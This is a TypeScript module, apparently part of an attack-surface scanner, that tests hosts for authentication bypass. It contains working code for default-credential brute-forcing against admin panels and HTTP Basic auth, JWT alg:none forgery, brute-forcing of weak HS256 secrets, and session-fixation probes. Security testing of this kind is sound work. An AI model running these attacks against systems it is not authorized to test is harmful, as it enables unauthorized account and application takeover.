/**
 * Auth Bypass Testing Module
 *
 * Tests:
 *  1. Default credentials on known admin panels (form POST, multi field-set).
 *  2. JWT none-algorithm bypass (alg:"none" + empty signature forgery).
 *  3. JWT weak-secret brute (HS256 with common secrets).
 *  4. Basic auth default-credential brute (401 + WWW-Authenticate: Basic).
 *  5. Session fixation (server reflects/reuses a client-supplied session ID).
 *
 * Uses only built-in fetch + crypto (Bun / Node 18+). Per-request timeout 8s.
 * User-Agent: "easm-scanner/1.0". Imports only types from "./types".
 */
import type { AuthResult } from "./types";
import { createHmac } from "crypto";

const UA = "easm-scanner/1.0";
const TIMEOUT_MS = 8000;
const MAX_HOSTS = 5;
const MAX_PANELS_PER_HOST = 8;

/** Known admin panel paths to probe for default credentials. */
const PANEL_PATHS = [
  "/admin",
  "/admin/login",
  "/wp-login.php",
  "/wp-admin/",
  "/phpmyadmin/",
  "/manager/html",
  "/console",
  "/login",
  "/signin",
  "/dashboard",
  "/cpanel",
  "/administrator",
];

/** Default credential pairs (capped at 15). */
const DEFAULT_CREDS: [string, string][] = [
  ["admin", "admin"],
  ["admin", "password"],
  ["admin", "admin123"],
  ["root", "root"],
  ["root", "toor"],
  ["admin", "pass"],
  ["test", "test"],
  ["user", "user"],
  ["admin", "123456"],
  ["admin", "admin@123"],
  ["guest", "guest"],
  ["administrator", "password"],
  ["tomcat", "tomcat"],
  ["admin", "changeme"],
  ["admin", "P@ssw0rd"],
];

/** Form field name sets to try (in priority order). */
const FORM_FIELD_SETS: { user: string; pass: string }[] = [
  { user: "username", pass: "password" },
  { user: "user", pass: "pass" },
  { user: "email", pass: "password" },
];

/** Common weak JWT secrets to brute-force HS256 signatures. */
const WEAK_JWT_SECRETS = [
  "secret",
  "password",
  "123456",
  "key",
  "jwt-secret",
  "changeme",
  "admin",
  "your-256-bit-secret",
  "supersecret",
  "token",
];

/** Default credentials to try via HTTP Basic auth. */
const BASIC_AUTH_CREDS: [string, string][] = [
  ["admin", "admin"],
  ["root", "root"],
  ["admin", "password"],
  ["test", "test"],
];

/** Session cookie names to test for fixation. */
const SESSION_COOKIES = ["PHPSESSID", "JSESSIONID", "session"];

/** Regex to find JWT tokens in cookies / headers / JSON responses. */
const JWT_RE = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;

interface Finding {
  id: string;
  severity: "high" | "medium" | "low" | "info";
  title: string;
  detail: string;
}

interface Resp {
  status: number;
  body: string;
  headers: Record<string, string>;
}

// ---- base64url + JWT helpers (Node crypto only) ----

function base64urlEncode(buf: Buffer | string): string {
  const b = typeof buf === "string" ? Buffer.from(buf) : buf;
  return b
    .toString("base64")
    .replace(/=+$/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
}

function base64urlDecode(s: string): string {
  let pad = s.length % 4;
  if (pad) s += "=".repeat(4 - pad);
  s = s.replace(/-/g, "+").replace(/_/g, "/");
  return Buffer.from(s, "base64").toString("utf8");
}

function b64urlEncodeStr(s: string): string {
  return base64urlEncode(Buffer.from(s, "utf8"));
}

function hs256Sign(data: string, secret: string): string {
  const h = createHmac("sha256", secret).update(data).digest();
  return h
    .toString("base64")
    .replace(/=+$/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
}

/** Build a JWT. Pass `secret=undefined` for alg:"none" (empty signature). */
function makeJwt(
  header: Record<string, unknown>,
  payload: Record<string, unknown>,
  secret?: string
): string {
  const h = b64urlEncodeStr(JSON.stringify(header));
  const p = b64urlEncodeStr(JSON.stringify(payload));
  const data = `${h}.${p}`;
  if (secret === undefined) return `${data}.`; // none algorithm: empty signature
  return `${data}.${hs256Sign(data, secret)}`;
}

function decodeJwtHeader(tok: string): Record<string, unknown> | null {
  const parts = tok.split(".");
  if (parts.length < 2) return null;
  try {
    return JSON.parse(base64urlDecode(parts[0]));
  } catch {
    return null;
  }
}

function decodeJwtPayload(tok: string): Record<string, unknown> | null {
  const parts = tok.split(".");
  if (parts.length < 2) return null;
  try {
    return JSON.parse(base64urlDecode(parts[1]));
  } catch {
    return null;
  }
}

// ---- HTTP helper ----

async function req(
  url: string,
  opts: {
    method?: string;
    headers?: Record<string, string>;
    body?: string;
    redirect?: "manual" | "follow" | "error";
  } = {}
): Promise<Resp | null> {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), TIMEOUT_MS);
  try {
    const res = await fetch(url, {
      method: opts.method || "GET",
      redirect: opts.redirect || "manual",
      signal: ctrl.signal,
      headers: { "User-Agent": UA, ...(opts.headers || {}) },
      ...(opts.body !== undefined ? { body: opts.body } : {}),
    });
    let b = "";
    try {
      b = await res.text();
    } catch {
      /* ignore body read errors */
    }
    const h: Record<string, string> = {};
    res.headers.forEach((v, k) => (h[k.toLowerCase()] = v));
    return { status: res.status, body: b.slice(0, 200000), headers: h };
  } catch {
    return null;
  } finally {
    clearTimeout(t);
  }
}

function truncate(s: string, n = 200): string {
  return s.length > n ? s.slice(0, n) + "..." : s;
}

/**
 * Heuristic: does the response indicate a successful login?
 *   - 302/303 redirect (typical post-login redirect to dashboard)
 *   - 200 + positive keyword (logout/welcome/dashboard/success/authenticated)
 *   - Sets a session-like cookie (not a deletion cookie)
 * Negative indicators (incorrect/invalid/error/locked) override positives.
 */
function looksLikeLoginSuccess(r: Resp): boolean {
  if (r.status === 302 || r.status === 303) return true;
  if (r.status === 200) {
    const lower = r.body.toLowerCase();
    const negPatterns = [
      "incorrect",
      "invalid",
      "wrong username",
      "wrong password",
      "login failed",
      "authentication failed",
      "auth failed",
      "mismatch",
      "does not match",
      "captcha",
      "try again",
      "denied",
      "locked",
      "exceeded",
      "too many",
      "not found",
    ];
    if (negPatterns.some((p) => lower.includes(p))) return false;
    if (
      lower.includes("logout") ||
      lower.includes("welcome") ||
      lower.includes("dashboard") ||
      lower.includes('"success":true') ||
      lower.includes('"authenticated"') ||
      lower.includes('"status":"ok"')
    ) {
      return true;
    }
  }
  // Set-Cookie with session-like name and not a deletion
  const sc = r.headers["set-cookie"];
  if (sc) {
    const scl = sc.toLowerCase();
    const isDeletion =
      scl.includes("=deleted") ||
      scl.includes("expires=thu, 01-jan-1970") ||
      scl.includes("max-age=0");
    const isSession =
      scl.includes("session") ||
      scl.includes("sid") ||
      scl.includes("auth") ||
      scl.includes("token");
    if (isSession && !isDeletion) return true;
  }
  return false;
}

/**
 * Detect username/password form field names by parsing <input> tags from
 * the panel HTML. Returns null if no password input found. The returned
 * shape matches the FORM_FIELD_SETS entries so callers can use either
 * interchangeably.
 */
function detectFormFields(
  html: string
): { user: string; pass: string } | null {
  const inputs: { name: string; type: string }[] = [];
  const re = /<input[^>]*\bname\s*=\s*["']([^"']+)["'][^>]*>/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(html)) !== null) {
    const tag = m[0].toLowerCase();
    const typeMatch = tag.match(/\btype\s*=\s*["']([^"']+)["']/i);
    const type = typeMatch ? typeMatch[1].toLowerCase() : "text";
    inputs.push({ name: m[1], type });
  }
  const passField = inputs.find((i) => i.type === "password")?.name;
  if (!passField) return null;
  const userField = inputs.find(
    (i) =>
      i.type !== "password" &&
      i.type !== "hidden" &&
      i.type !== "submit" &&
      i.type !== "button" &&
      i.type !== "checkbox" &&
      i.type !== "radio"
  )?.name;
  if (!userField) return null;
  return { user: userField, pass: passField };
}

/** Resolve a possibly-relative path against a base URL. */
function resolveUrl(base: string, path: string): string | null {
  try {
    return new URL(path, base).toString();
  } catch {
    return null;
  }
}

/**
 * Run auth-bypass tests against the provided list of URLs.
 * Caps at MAX_HOSTS hosts and MAX_PANELS_PER_HOST panel paths per host.
 */
export async function runAuth(
  urls: string[],
  log: (msg: string) => void
): Promise<AuthResult> {
  const hosts: AuthResult["hosts"] = [];
  const defaultCreds: AuthResult["defaultCreds"] = [];
  const jwtTests: AuthResult["jwtTests"] = [];

  log(`Testing auth bypass on ${urls.length} host(s) ...`);
  const targets = urls.slice(0, MAX_HOSTS);

  for (let i = 0; i < targets.length; i++) {
    const url = targets[i];
    log(`  host ${i + 1}/${targets.length}: ${url}`);

    const findings: Finding[] = [];

    // baseline fetch (no auth)
    const baseline = await req(url);
    if (!baseline) {
      log(`    [-] ${url} - no response`);
      hosts.push({ url, findings: [] });
      continue;
    }

    // ---------------------------------------------------------------
    // 1. Default credentials on admin panels
    // ---------------------------------------------------------------
    let panelsTested = 0;
    for (const panel of PANEL_PATHS) {
      if (panelsTested >= MAX_PANELS_PER_HOST) break;
      const panelUrl = resolveUrl(url, panel);
      if (!panelUrl) continue;

      // Probe panel existence via GET
      const probe = await req(panelUrl);
      if (!probe) continue;
      if (probe.status === 404) continue;
      // Soft-404 detection
      if (
        probe.status === 200 &&
        /not found|404|doesn'?t exist|page not found|forbidden/i.test(probe.body) &&
        probe.body.length < 4096
      ) {
        continue;
      }
      // Skip Basic-auth-protected panels (handled by basic-auth brute below)
      const wwwAuth = probe.headers["www-authenticate"] || "";
      if (
        probe.status === 401 &&
        /basic/i.test(wwwAuth) &&
        !/digest/i.test(wwwAuth)
      ) {
        continue;
      }

      panelsTested++;
      log(
        `  testing ${panel} with ${DEFAULT_CREDS.length} credential pairs ...`
      );

      // Detect form field names (or fallback to first known set)
      let fields = detectFormFields(probe.body);
      if (!fields) fields = FORM_FIELD_SETS[0];

      let panelSuccess = false;
      let successCred: [string, string] | null = null;
      let successFieldSet: { user: string; pass: string } | null = null;

      // Try each field set; first one that yields a success wins.
      for (const fs of [fields, ...FORM_FIELD_SETS]) {
        if (panelSuccess) break;
        const tried = new Set<string>();
        for (const [user, pass] of DEFAULT_CREDS) {
          if (panelSuccess) break;
          const key = `${fs.user}=${user};${fs.pass}=${pass}`;
          if (tried.has(key)) continue;
          tried.add(key);
          const form = new URLSearchParams();
          form.set(fs.user, user);
          form.set(fs.pass, pass);
          // Some panels expect extra fields (e.g. wp-login needs log+pwd+redirect_to)
          const r = await req(panelUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
              Accept: "text/html,application/json;q=0.9,*/*;q=0.8",
              Referer: panelUrl,
            },
            body: form.toString(),
            redirect: "manual",
          });
          if (r && looksLikeLoginSuccess(r)) {
            panelSuccess = true;
            successCred = [user, pass];
            successFieldSet = fs;
            break;
          }
        }
      }

      defaultCreds.push({
        url,
        panel,
        tested: DEFAULT_CREDS.length,
        success: panelSuccess,
      });

      if (panelSuccess && successCred && successFieldSet) {
        const [user, pass] = successCred;
        log(
          `  [!] DEFAULT CREDS: ${user}:${pass} on ${url}${panel}`
        );
        findings.push({
          id: "AUTH-DEFAULT-CREDS",
          severity: "high",
          title: "Default credentials accepted on admin panel",
          detail:
            `Login to ${panel} succeeded with default credentials ` +
            `${user}:${pass} (fields: ${successFieldSet.user}/${successFieldSet.pass}). ` +
            `An attacker can fully compromise the application via this panel.`,
        });
      }
    }

    // ---------------------------------------------------------------
    // 2. JWT none-algorithm + weak-secret bypass
    // ---------------------------------------------------------------
    const seenTokens = new Set<string>();
    const collectTokens = (r: Resp | null) => {
      if (!r) return;
      const sc = r.headers["set-cookie"];
      if (sc) {
        for (const m of sc.matchAll(JWT_RE)) seenTokens.add(m[0]);
      }
      for (const m of r.body.matchAll(JWT_RE)) seenTokens.add(m[0]);
    };
    collectTokens(baseline);

    let noneAlgAccepted = false;
    let weakSecret = false;
    let jwtDetail = "no JWT tokens observed in baseline response";

    if (seenTokens.size > 0) {
      const tok = Array.from(seenTokens)[0];
      const header = decodeJwtHeader(tok);
      const payload = decodeJwtPayload(tok) || {};
      const alg =
        header && typeof header.alg === "string" ? header.alg : "unknown";
      jwtDetail = `observed token alg=${alg}; tested none-alg forgery + ${WEAK_JWT_SECRETS.length} weak secrets`;

      // Confirm the target URL is JWT-protected: send no-auth + bad-token
      const badTok = makeJwt(
        { alg: "HS256", typ: "JWT" },
        { ...payload, iat: 0, exp: 0 },
        "easm-wrong-secret-xxxxxxxxxxxxxxx"
      );
      const withBadTok = await req(url, {
        headers: { Authorization: `Bearer ${badTok}` },
      });
      const isProtected =
        (baseline.status === 401 || baseline.status === 403) ||
        (withBadTok !== null &&
          (withBadTok.status === 401 || withBadTok.status === 403));

      if (isProtected) {
        // ---- 2a. alg: none forgery ----
        if (
          alg === "RS256" ||
          alg === "HS256" ||
          alg === "ES256" ||
          alg === "HS384" ||
          alg === "HS512" ||
          alg === "RS384" ||
          alg === "RS512"
        ) {
          const noneTok = makeJwt({ alg: "none", typ: "JWT" }, payload);
          const r = await req(url, {
            headers: { Authorization: `Bearer ${noneTok}` },
          });
          if (r && (r.status === 200 || r.status === 302 || r.status === 303)) {
            noneAlgAccepted = true;
            log(`  [!] HIGH JWT none-alg bypass accepted: ${url}`);
            findings.push({
              id: "AUTH-JWT-NONE-ALG",
              severity: "high",
              title: "JWT none-algorithm bypass accepted",
              detail:
                `Forged token with alg:"none" and an empty signature was ` +
                `accepted by the server (status ${r.status}). The JWT library ` +
                `does not enforce algorithm whitelisting; any attacker can ` +
                `forge tokens with arbitrary payloads.`,
            });
          }
        }

        // ---- 2b. weak-secret brute (HS256) ----
        for (const secret of WEAK_JWT_SECRETS) {
          const forged = makeJwt({ alg: "HS256", typ: "JWT" }, payload, secret);
          const r = await req(url, {
            headers: { Authorization: `Bearer ${forged}` },
          });
          if (
            r &&
            (r.status === 200 || r.status === 302 || r.status === 303)
          ) {
            weakSecret = true;
            log(
              `  [!] HIGH JWT weak secret accepted: ${url} (secret="${secret}")`
            );
            findings.push({
              id: "AUTH-JWT-WEAK-SECRET",
              severity: "high",
              title: "JWT signed with weak secret accepted",
              detail:
                `A forged HS256 token signed with the common secret ` +
                `"${secret}" was accepted by the server (status ${r.status}). ` +
                `The HS256 signing secret is trivially guessable; attackers ` +
                `can mint arbitrary tokens.`,
            });
            break;
          }
        }
      } else {
        jwtDetail += `; URL not JWT-protected (no-auth/bad-token status: ${baseline.status}/${withBadTok?.status})`;
      }
    }
    jwtTests.push({ url, noneAlgAccepted, weakSecret, detail: jwtDetail });

    // ---------------------------------------------------------------
    // 3. Basic auth default-credential brute
    // ---------------------------------------------------------------
    if (baseline.status === 401) {
      const wwwAuth = baseline.headers["www-authenticate"] || "";
      if (/basic/i.test(wwwAuth)) {
        log(`  testing Basic auth brute on ${url} ...`);
        for (const [user, pass] of BASIC_AUTH_CREDS) {
          const cred = Buffer.from(`${user}:${pass}`).toString("base64");
          const r = await req(url, {
            headers: { Authorization: `Basic ${cred}` },
          });
          if (r && r.status >= 200 && r.status < 300) {
            log(
              `  [!] HIGH Weak Basic Auth: ${user}:${pass} on ${url}`
            );
            findings.push({
              id: "AUTH-BASIC-WEAK",
              severity: "high",
              title: "Weak Basic Auth credentials",
              detail:
                `HTTP Basic Auth endpoint accepted default credentials ` +
                `${user}:${pass}. The server returns 200 OK with these ` +
                `credentials, granting unauthorized access.`,
            });
            break;
          }
        }
      }
    }

    // ---------------------------------------------------------------
    // 4. Session fixation
    // ---------------------------------------------------------------
    for (const cname of SESSION_COOKIES) {
      const r = await req(url, {
        headers: { Cookie: `${cname}=easmfixation123` },
      });
      if (!r) continue;
      const sc = r.headers["set-cookie"];
      if (sc && sc.toLowerCase().includes("easmfixation123")) {
        log(`  [!] MED Session fixation: ${url} (${cname})`);
        findings.push({
          id: "AUTH-SESSION-FIXATION",
          severity: "medium",
          title: "Session fixation — server reuses supplied session ID",
          detail:
            `The server accepted the client-supplied ${cname}=easmfixation123 ` +
            `cookie and reflected/reused it in its Set-Cookie response. An ` +
            `attacker can pre-set a known session ID on a victim's browser, ` +
            `then hijack the session after the victim authenticates. The ` +
            `server should always regenerate session IDs on login.`,
        });
        break;
      }
    }

    hosts.push({ url, findings });
    log(`  [+] ${url}: ${findings.length} finding(s)`);
  }

  const totalFindings = hosts.reduce((a, h) => a + h.findings.length, 0);
  const credSuccess = defaultCreds.filter((c) => c.success).length;
  const jwtIssues = jwtTests.filter(
    (j) => j.noneAlgAccepted || j.weakSecret
  ).length;
  log(
    `Auth bypass complete: ${totalFindings} finding(s), ` +
    `${credSuccess}/${defaultCreds.length} panel(s) with default creds, ` +
    `${jwtIssues} JWT issue(s) across ${hosts.length} host(s).`
  );

  // Truncate any overly-long detail strings for safety
  for (const h of hosts) {
    for (const f of h.findings) {
      if (f.detail.length > 500) f.detail = truncate(f.detail, 500);
    }
  }

  return { hosts, defaultCreds, jwtTests };
}
